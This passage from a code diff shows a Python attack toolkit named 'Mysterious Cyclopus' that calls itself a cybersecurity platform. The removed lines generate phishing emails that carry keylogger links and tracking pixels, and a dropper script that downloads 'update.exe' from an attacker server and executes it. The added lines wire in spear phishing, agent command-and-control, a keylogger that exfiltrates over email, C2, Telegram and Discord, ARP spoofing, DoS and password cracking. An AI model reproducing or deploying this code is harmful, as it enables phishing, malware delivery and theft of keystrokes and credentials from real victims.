-        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
-        with open(pdf_path, 'w') as f:
-            f.write(pdf_content)
-        
-        deployment = Deployment(
-            id=deployment_id,
-            name=name,
-            type="pdf",
-            payload=pdf_path,
-            target=target,
-            created_at=datetime.datetime.now().isoformat()
-        )
-        
-        self.db.save_deployment(deployment)
-        return deployment
-    
-    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
-        deployment_id = str(uuid.uuid4())[:8]
-        
-        email_content = f"""
-        Subject: {subject}
-        From: security@example.com
-        To: {target}
-        Content-Type: text/html
-        
-        <html>
-        <body>
-        {body}
-        <br><br>
-        <a href="{keylog_url}">Click here to view the document</a>
-        <br><br>
-        <img src="{keylog_url}/tracking.gif" width="1" height="1">
-        </body>
-        </html>
-        """
-        
-        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
-        with open(email_path, 'w') as f:
-            f.write(email_content)
-        
-        deployment = Deployment(
-            id=deployment_id,
-            name=name,
-            type="email",
-            payload=email_path,
-            target=target,
-            created_at=datetime.datetime.now().isoformat()
-        )
-        
-        self.db.save_deployment(deployment)
-        return deployment
-    
-    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
-        deployment_id = str(uuid.uuid4())[:8]
-        
-        if SHORTENER_AVAILABLE:
-            try:
-                s = pyshorteners.Shortener()
-                keylog_url = s.tinyurl.short(keylog_url)
-            except:
-                pass
-        
-        deployment = Deployment(
-            id=deployment_id,
-            name=name,
-            type="link",
-            payload=keylog_url,
-            target=target,
-            created_at=datetime.datetime.now().isoformat()
-        )
-        
-        self.db.save_deployment(deployment)
-        return deployment
-    
-    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
-        deployment_id = str(uuid.uuid4())[:8]
-        
-        exe_content = f'''
-import os
-import sys
-import subprocess
-import requests
-
-def download_and_execute(url):
-    try:
-        response = requests.get(url, timeout=30)
-        if response.status_code == 200:
-            temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'update.exe')
-            with open(temp_path, 'wb') as f:
-                f.write(response.content)
-            os.chmod(temp_path, 0o755)
-            subprocess.Popen([temp_path], shell=True)
-    except:
-        pass
-
-if __name__ == "__main__":
-    download_and_execute("{keylog_server}/download")
-'''
-        
-        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
-        with open(exe_path, 'w') as f:
-            f.write(exe_content)
-        
-        deployment = Deployment(
-            id=deployment_id,
-            name=name,
-            type="executable",
-            payload=exe_path,
-            target=target,
-            created_at=datetime.datetime.now().isoformat()
-        )
-        
-        self.db.save_deployment(deployment)
-        return deployment
-    
-    def get_deployments(self) -> List[Dict]:
-        return self.db.get_deployments()
 
 # =====================
 # MAIN APPLICATION
@@ -6787,41 +7996,44 @@ class MysteriousCyclopus:
     def __init__(self):
         self.config = ConfigManager()
         self.db = DatabaseManager()
-        self.transformer = TransformerEngine(self.config)
         self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
         self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
+        self.nikto = NiktoScanner(self.db)
         self.dos = DOSEngine(self.db, self.config)
+        self.spear = SpearPhishingEngine(self.db, self.config)
+        self.agent = AgentEngine(self.db, self.config)
+        self.network_monitor = NetworkMonitor(self.db, self.config)
         self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
         self.deployment = DeploymentEngine(self.db, self.config)
+        self.domain_hosting = DomainHostingEngine(self.db, self.config)
         self.cracking = CrackingEngine(self.db, self.config)
         self.arp_spoofing = ARPSpoofingEngine(self.db, self.config) if SCAPY_AVAILABLE else None
         self.mac_manager = MACManager(self.db)
         self.nat_info = NATInfoEngine(self.db)
         self.docker_scanner = DockerScanner(self.db)
         self.social = SocialEngineeringTools(self.db)
-        self.network_monitor = NetworkMonitor(self.db, self.config)
+        
+        # Email Composer & PDF Reports
+        self.email_composer = EmailComposerEngine(self.db, self.config)
+        self.pdf_report = PDFReportGenerator(self.db, self.config)
         
         # Platform bots
         self.discord = DiscordBot(None, self.db)
         self.telegram = TelegramBot(None, self.db)
         self.slack = SlackBot(None, self.db)
         self.signal = SignalBot(None, self.db)
-        self.whatsapp = WhatsAppBot(None, self.db)
-        self.google_chat = GoogleChatBot(None, self.db)
         self.imessage = iMessageBot(None, self.db)
+        self.google_chat = GoogleChatBot(None, self.db)
+        self.whatsapp = WhatsAppBot(None, self.db)
         
-        # Email Composer & PDF Report
-        self.email_composer = EmailComposerEngine(self.db, self.config)
-        self.pdf_report = PDFReportGenerator(self.db, self.config)
-        
-        # Set up handler
+        # Set up handlers
         self.handler = CommandHandler(
-            self.db, self.ssh, self.traffic,
-            self.dos, self.keylogger, self.deployment,
+            self.db, self.ssh, self.traffic, self.nikto,
+            self.dos, self.spear, self.agent, self.network_monitor,
+            self.keylogger, self.deployment, self.domain_hosting,
             self.cracking, self.arp_spoofing, self.mac_manager,
-            self.nat_info, self.transformer, self.email_composer,
-            self.pdf_report, self.docker_scanner, self.social,
-            self.network_monitor
+            self.nat_info, self.email_composer, self.pdf_report,
+            self.docker_scanner
         )
         
         # Connect bots to handler
@@ -6829,9 +8041,9 @@ class MysteriousCyclopus:
         self.telegram.handler = self.handler
         self.slack.handler = self.handler
         self.signal.handler = self.handler
-        self.whatsapp.handler = self.handler
-        self.google_chat.handler = self.handler
         self.imessage.handler = self.handler
+        self.google_chat.handler = self.handler
+        self.whatsapp.handler = self.handler
         
         # Connect keylogger to bots
         if self.keylogger:
@@ -6844,41 +8056,45 @@ class MysteriousCyclopus:
     
     def print_banner(self):
         banner = f"""
-{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
-║{Colors.ACCENT}     🐙 MYSTERIOUS CYCLOPUS BOT v1.0.0 -                              {Colors.PRIMARY}║
+{Colors.ORANGE}╔══════════════════════════════════════════════════════════════════════════════╗
+║{Colors.WHITE}        🐙 MYSTERIOUS CYCLOPUS v1.0.0 - Cybersecurity Platform         {Colors.ORANGE}║
 ╠══════════════════════════════════════════════════════════════════════════════╣
-║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 🐙 100+ Security Commands         • 📡 Ping / Nmap / Curl / Netcat   {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation       {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 🕷️ Wget / Traceroute / Whois        • 🎣 Social Engineering Suite     {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities       {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration   • 💻 Web Dashboard                 {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • Discord | Telegram | Slack          • Signal | WhatsApp | Google Chat  {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 🕸️ ARP Spoofing & MAC Mgmt         • 🌐 NAT Information               {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 🔓 Password Cracking Engine         • 🐳 Docker Security Scanning      {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 🔮 AI Transformer Engine            • 🎬 Terminal Animations           {Colors.PRIMARY}║
-║{Colors.SUCCESS}  • 📧 Email Composition & Sending       • 📊 PDF Report Generation         {Colors.PRIMARY}║
+║{Colors.WHITE}                                                                           {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🐙 200+ Security Commands         • 📡 Ping / Nmap / Curl / Netcat{Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation    {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🕷️ Nikto Web Vulnerability Scanner  • 🎣 Social Engineering Suite   {Colors.ORANGE}║
+║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities    {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 📧 Spear Phishing Campaigns        • 🤖 Agent Command & Control    {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration  • 💻 Web Dashboard              {Colors.ORANGE}║
+║{Colors.SUCCESS}  • Discord | Telegram | Slack         • Signal | WhatsApp | GoogleChat{Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection • 🌐 IP to Domain Translation   {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🏠 Domain Hosting Engine           • 📊 Graphical Reports         {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 📡 Network Monitoring               • 🔐 Agent Mode                 {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 📦 PDF/Email/Link Deployment       • 🔑 Clipboard/SSH Key Capture  {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🔓 Password Cracking Engine        • 🐳 Docker Security Scanning   {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 📡 MAC Address Management          • 🌐 NAT Information            {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 🕸️ ARP Spoofing                    • 📧 Email Composition        {Colors.ORANGE}║
+║{Colors.SUCCESS}  • 📊 PDF Report Generation           • 🎯 200+ Commands              {Colors.ORANGE}║
 ╠══════════════════════════════════════════════════════════════════════════════╣
-║{Colors.ACCENT}                    🎯 ACCURATE CYBER DEFENSE                         {Colors.PRIMARY}║
+║{Colors.WHITE}                    🎯 ACCURATE CYBER DEFENSE                           {Colors.ORANGE}║
 ╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
 
-{Colors.SECONDARY}🐙 Welcome to MYSTERIOUS CYCLOPUS BOT - Your Ultimate Security Assistant{Colors.RESET}
-{Colors.SECONDARY}💡 Type 'help' to see all commands{Colors.RESET}
-{Colors.SECONDARY}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
-{Colors.SECONDARY}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
-{Colors.SECONDARY}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
-{Colors.SECONDARY}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
-{Colors.SECONDARY}🔓 Use 'crack' commands for password cracking{Colors.RESET}
-{Colors.SECONDARY}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
-{Colors.SECONDARY}📡 Use 'mac_info' for MAC address information{Colors.RESET}
-{Colors.SECONDARY}🌐 Use 'nat_info' for NAT information{Colors.RESET}
-{Colors.SECONDARY}🔮 Use 'transform' for AI-powered command processing{Colors.RESET}
-{Colors.SECONDARY}🎬 Use 'anim_*' for terminal animations{Colors.RESET}
+{Colors.SUCCESS}🐙 Welcome to Mysterious Cyclopus - Your Ultimate Security Assistant{Colors.RESET}
+{Colors.WHITE}💡 Type 'help' to see all commands{Colors.RESET}
+{Colors.WHITE}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
+{Colors.WHITE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
+{Colors.WHITE}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
+{Colors.WHITE}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
+{Colors.WHITE}🔓 Use 'crack' commands for password cracking{Colors.RESET}
+{Colors.WHITE}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
+{Colors.WHITE}📡 Use 'mac_info' for MAC address information{Colors.RESET}
+{Colors.WHITE}🌐 Use 'nat_info' for NAT information{Colors.RESET}
+{Colors.WHITE}📱 Use 'platform_*' commands for cross-platform execution{Colors.RESET}
         """
         print(banner)
     
     def check_dependencies(self):
-        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
+        print(f"\n{Colors.ORANGE}🔍 Checking dependencies...{Colors.RESET}")
         
         tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'wget', 'docker']
         for tool in tools:
@@ -6895,107 +8111,146 @@ class MysteriousCyclopus:
         print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
         print(f"{Colors.SUCCESS if DNS_AVAILABLE else Colors.WARNING}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.WARNING}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
         print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
+        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
+        print(f"{Colors.SUCCESS if SELENIUM_AVAILABLE else Colors.WARNING}✅ selenium{Colors.RESET}" if SELENIUM_AVAILABLE else f"{Colors.WARNING}⚠️ selenium not found - WhatsApp disabled{Colors.RESET}")
+        
+        if shutil.which('hashcat'):
+            print(f"{Colors.SUCCESS}✅ hashcat{Colors.RESET}")
+        else:
+            print(f"{Colors.WARNING}⚠️ hashcat not found - cracking will use Python fallback{Colors.RESET}")
+        
+        if shutil.which('signal-cli'):
+            print(f"{Colors.SUCCESS}✅ signal-cli{Colors.RESET}")
+        else:
+            print(f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
+        
+        if self.nikto.available:
+            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
+        else:
+            print(f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
     
     def setup_platforms(self):
-        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
-        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
+        print(f"\n{Colors.ORANGE}🤖 Platform Bot Configuration{Colors.RESET}")
+        print(f"{Colors.ORANGE}{'='*50}{Colors.RESET}")
         
         # Discord
-        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
+        setup = input(f"{Colors.WHITE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
         if setup == 'y':
-            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
+            token = input(f"{Colors.WHITE}Enter Discord bot token: {Colors.RESET}").strip()
+            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
+            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
             if token:
-                self.discord.config = {'enabled': True, 'token': token, 'prefix': '!'}
+                self.discord.save_config(token, True, prefix)
+                self.discord.config['channel_id'] = channel
                 if self.discord.setup():
                     self.discord.start()
                     print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
         
         # Telegram
-        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
+        setup = input(f"{Colors.WHITE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
         if setup == 'y':
-            token = input(f"{Colors.ACCENT}Enter Telegram bot token: {Colors.RESET}").strip()
-            chat_id = input(f"{Colors.ACCENT}Enter chat ID: {Colors.RESET}").strip()
+            token = input(f"{Colors.WHITE}Enter Telegram bot token: {Colors.RESET}").strip()
+            chat_id = input(f"{Colors.WHITE}Enter chat ID: {Colors.RESET}").strip()
+            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
             if token:
-                self.telegram.config = {'enabled': True, 'bot_token': token, 'chat_id': chat_id, 'prefix': '/'}
+                self.telegram.save_config(token, chat_id, True, prefix)
                 self.telegram.start()
                 print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
         
         # Slack
-        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
+        setup = input(f"{Colors.WHITE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
         if setup == 'y':
-            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
+            token = input(f"{Colors.WHITE}Enter Slack bot token: {Colors.RESET}").strip()
+            channel = input(f"{Colors.WHITE}Enter channel ID: {Colors.RESET}").strip()
+            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
             if token:
-                self.slack.config = {'enabled': True, 'bot_token': token, 'channel_id': '', 'prefix': '!'}
+                self.slack.save_config(token, channel, True, prefix)
                 if self.slack.setup():
                     self.slack.start()
                     print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
         
-        # WhatsApp
-        setup = input(f"{Colors.ACCENT}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
+        # Signal
+        setup = input(f"{Colors.WHITE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
         if setup == 'y':
-            phone = input(f"{Colors.ACCENT}Enter WhatsApp phone number: {Colors.RESET}").strip()
+            phone = input(f"{Colors.WHITE}Enter phone number: {Colors.RESET}").strip()
+            group = input(f"{Colors.WHITE}Enter group ID (optional): {Colors.RESET}").strip()
+            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
             if phone:
-                self.whatsapp.config = {'enabled': True, 'phone_number': phone, 'prefix': '!'}
+                self.signal.save_config(phone, group, True, prefix)
+                self.signal.start()
+                print(f"{Colors.SUCCESS}✅ Signal bot starting...{Colors.RESET}")
+        
+        # WhatsApp
+        setup = input(f"{Colors.WHITE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
+        if setup == 'y':
+            phone = input(f"{Colors.WHITE}Enter WhatsApp phone number: {Colors.RESET}").strip()
+            prefix = input(f"{Colors.WHITE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
+            if phone:
+                self.whatsapp.save_config(phone, True, prefix)
                 self.whatsapp.start()
                 print(f"{Colors.SUCCESS}✅ WhatsApp bot configured...{Colors.RESET}")
         
-        # Signal
-        setup = input(f"{Colors.ACCENT}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
-        if setup == 'y':
-            phone = input(f"{Colors.ACCENT}Enter Signal phone number: {Colors.RESET}").strip()
-            if phone:
-                self.signal.config = {'enabled': True, 'phone_number': phone, 'prefix': '!'}
-                self.signal.start()
-                print(f"{Colors.SUCCESS}✅ Signal bot configured...{Colors.RESET}")
-        
         # Google Chat
-        setup = input(f"{Colors.ACCENT}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
+        setup = input(f"{Colors.WHITE}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
         if setup == 'y':
-            webhook = input(f"{Colors.ACCENT}Enter Google Chat webhook URL: {Colors.RESET}").strip()
+            webhook = input(f"{Colors.WHITE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
+            prefix = input(f"{Colors.WHITE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
             if webhook:
-                self.google_chat.config = {'enabled': True, 'webhook_url': webhook, 'prefix': '/'}
+                self.google_chat.save_config(webhook, "", True, prefix)
                 self.google_chat.start()
                 print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
         
         # Web Dashboard
-        setup = input(f"{Colors.ACCENT}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
+        setup = input(f"{Colors.WHITE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
         if setup == 'y':
-            port = input(f"{Colors.ACCENT}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
-            self.config.set('web.port', int(port))
+            port = input(f"{Colors.WHITE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
+            host = input(f"{Colors.WHITE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
             self.config.set('web.enabled', True)
+            self.config.set('web.port', int(port))
+            self.config.set('web.host', host)
             self.config.save()
             self.web.start()
             print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
+        
+        # Keylogger
+        setup = input(f"{Colors.WHITE}Enable keylogger? (y/n): {Colors.RESET}").strip().lower()
+        if setup == 'y':
+            if self.keylogger:
+                self.config.set('keylogger.enabled', True)
+                self.config.set('keylogger.exfil_methods', ['file', 'email', 'c2', 'telegram', 'discord'])
+                self.config.save()
+                print(f"{Colors.SUCCESS}✅ Keylogger configured. Press F10 to start/stop.{Colors.RESET}")
+            else:
+                print(f"{Colors.WARNING}⚠️ Keylogger not available (pynput missing){Colors.RESET}")
     
     def run(self):
         os.system('cls' if os.name == 'nt' else 'clear')
-        
-        # Show startup animations
-        TerminalAnimation.matrix_rain(2.0)
-        TerminalAnimation.pulse_animation("🐙 MYSTERIOUS CYCLOPUS", 2.0)
-        TerminalAnimation.octopus_animation(2.0)
-        
         self.print_banner()
         self.check_dependencies()
         
-        # Start web dashboard by default
-        self.web.start()
+        auto_monitor = input(f"\n{Colors.WHITE}Start network monitoring? (y/n): {Colors.RESET}").strip().lower()
+        if auto_monitor == 'y':
+            self.network_monitor.start()
+            print(f"{Colors.SUCCESS}✅ Network monitoring started{Colors.RESET}")
         
-        setup_platforms = input(f"\n{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
+        setup_platforms = input(f"{Colors.WHITE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
         if setup_platforms == 'y':
             self.setup_platforms()
         
-        # Show final status
-        TerminalAnimation.wave_animation("🐙 CYCLOPUS READY", 2.0)
-        
-        print(f"\n{Colors.SUCCESS}✅ MYSTERIOUS CYCLOPUS ready! Session: {self.session_id}{Colors.RESET}")
-        print(f"{Colors.SECONDARY}   Type 'help' for commands{Colors.RESET}")
-        print(f"{Colors.SECONDARY}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
-        print(f"{Colors.SECONDARY}   🌐 Web dashboard: http://localhost:{self.config.get('web.port', 5000)}{Colors.RESET}")
+        print(f"\n{Colors.SUCCESS}✅ Mysterious Cyclopus ready! Session: {self.session_id}{Colors.RESET}")
+        print(f"{Colors.WHITE}   Type 'help' for commands, 'deploy_*' for payload deployment{Colors.RESET}")
+        print(f"{Colors.WHITE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
+        print(f"{Colors.WHITE}   🔓 Use 'crack' commands for password cracking{Colors.RESET}")
+        print(f"{Colors.WHITE}   🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}")
+        print(f"{Colors.WHITE}   📡 Use 'mac_info' for MAC address information{Colors.RESET}")
+        print(f"{Colors.WHITE}   🌐 Use 'nat_info' for NAT information{Colors.RESET}")
+        print(f"{Colors.WHITE}   📧 Use 'email_compose' to compose and send emails{Colors.RESET}")
+        print(f"{Colors.WHITE}   📊 Use 'report_generate' to generate PDF reports{Colors.RESET}")
+        print(f"{Colors.WHITE}   🐳 Use 'docker_*' for Docker operations{Colors.RESET}")
         
         while self.running:
             try:
-                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}{self.session_id}{Colors.PRIMARY}]{Colors.WHITE} 🐙> {Colors.RESET}"
+                prompt = f"{Colors.ORANGE}[{Colors.WHITE}{self.session_id}{Colors.ORANGE}]{Colors.WHITE} 🐙> {Colors.RESET}"
                 command = input(prompt).strip()
                 
                 if not command:
@@ -7027,17 +8282,19 @@ class MysteriousCyclopus:
         if self.keylogger and self.keylogger.running:
             self.keylogger.stop()
         self.network_monitor.stop()
+        self.agent.stop_heartbeat()
         self.db.close()
         print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
-        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
-        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")
+        print(f"{Colors.ORANGE}📁 Logs: {LOG_FILE}{Colors.RESET}")
+        print(f"{Colors.ORANGE}💾 Database: {DATABASE_FILE}{Colors.RESET}")
+        print(f"{Colors.ORANGE}📊 Reports: {PDF_REPORTS_DIR}{Colors.RESET}")
 
 # =====================
 # MAIN ENTRY POINT
 # =====================
 def main():
     try:
-        print(f"{Colors.PRIMARY}🐙 Starting MYSTERIOUS CYCLOPUS BOT...{Colors.RESET}")
+        print(f"{Colors.ORANGE}🐙 Starting Mysterious Cyclopus...{Colors.RESET}")
         
         if sys.version_info < (3, 7):
             print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
